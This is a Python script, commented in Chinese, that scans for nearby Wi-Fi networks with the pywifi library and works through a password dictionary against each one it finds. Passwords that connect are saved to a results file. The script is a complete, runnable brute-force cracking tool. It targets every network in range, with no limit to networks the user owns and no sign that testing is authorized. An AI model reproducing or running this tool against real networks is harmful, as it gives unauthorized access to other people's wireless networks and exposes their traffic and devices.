import time
import sys
import pywifi


def scans(interface, timeout):
	# 开始扫描
	interface.scan()
	time.sleep(timeout)
	# 在若干秒后获取扫描结果
	with open('TestRes.txt', 'w') as file:
		file.write(str(interface.scan_results()))
	return interface.scan_results()


def test(i, interface, x, key, stu, ts):
	# 显示对应网络名称，考虑到wifi名字有中文的情况,所以这种的就显示bssid
	showID = x.bssid if len(x.ssid) > len(
		x.bssid) else x.ssid  # 三元运算符,if成立返回x.bssid,否则返回x.ssid<注:ssid就是wifi的名字,bssid是其对应的mac地址<是一个16进制数字>

	# 迭代字典并进行爆破
	for n, k in enumerate(key):
		x.key = k.strip()  # 去掉空格之后的key
		interface.disconnect()  # 断开无线网卡连接
		time.sleep(3)  # 断开以后缓冲3秒

		# profile = pywifi.Profile()  # 配置文件
		# profile.auth = pywifi.const.AUTH_ALG_OPEN  # 需要密码链接
		# profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)  # wifi加密算法
		# profile.cipher = pywifi.const.CIPHER_TYPE_CCMP  # 加密单元
		# 移除所有热点配置
		interface.remove_all_network_profiles()
		# 将封装好的目标尝试连接
		interface.connect(interface.add_network_profile(x))
		# 初始化状态码，考虑到用0会发生些逻辑错误
		code = 10
		t1 = time.time()
		# 循环刷新状态，如果置为0则密码错误，如超时则进行下一个

		# profile.ssid = "PM2.5"  # 就是wifi名称
		# profile.key = password_str  # 测试密码成功或者失败
		#
		# tmp_profile = interface.add_network_profile(profile)  # 加载配置文件
		# interface.connect(tmp_profile)  # 连接

		while code != 0:
			time.sleep(0.1)
			code = interface.status()
			now = time.time() - t1
			if now > ts:
				break
			stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s" % (
				6, i, 18, showID, code, 5, now, 7, x.signal, 10, len(key) - n, 10, k.replace("\n", "")))
			stu.flush()
			# if code == pywifi.const.IFACE_CONNECTED:
			if code == 4:  # 4 对应的状态码就是 pywifi.const.IFACE_CONNECTED  已连接状态
				interface.disconnect()
				return "%-*s| %s | %*s |%*s\n" % (20, x.ssid, x.bssid, 3, x.signal, 15, k)


def main():
	# 扫描时常
	scantimes = 3
	# 单个密码测试延迟
	testtimes = 15
	output = sys.stdout
	# 结果文件保存路径
	files = "TestRes.txt"
	# 字典列表
	keys = open(sys.argv[1], "r").readlines()
	print("|KEYS %s" % (len(keys)))
	# 实例化一个pywifi对象
	wifi = pywifi.PyWiFi()
	# 选择定一个网卡并赋值于iface
	iface = wifi.interfaces()[0]
	# 通过iface进行一个时常为scantimes的扫描并获取附近的热点基础配置
	scanres = scans(iface, scantimes)

	# 统计附近被发现的热点数量
	nums = len(scanres)
	print("|SCAN GET %s" % (nums))
	print("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s" % (
		"-" * 70, 6, "WIFIID", 18, "SSID OR BSSID", 2, "N", 4, "time", 7, "signal", 10, "KEYNUM", 10, "KEY", "=" * 70))
	# 将每一个热点信息逐一进行测试
	for i, x in enumerate(scanres):
		# 测试完毕后，成功的结果将存储到files中
		res = test(nums - i, iface, x, keys, output, testtimes)
		if res:
			open(files, "a+").write(res)


if __name__ == '__main__':
	main()

# ----------------------------------另外----------------------->
# wifi = pywifi.PyWiFi()
# scans(wifi.interfaces()[0],5)
# 测试命令:
# python3 scan.py pass.txt
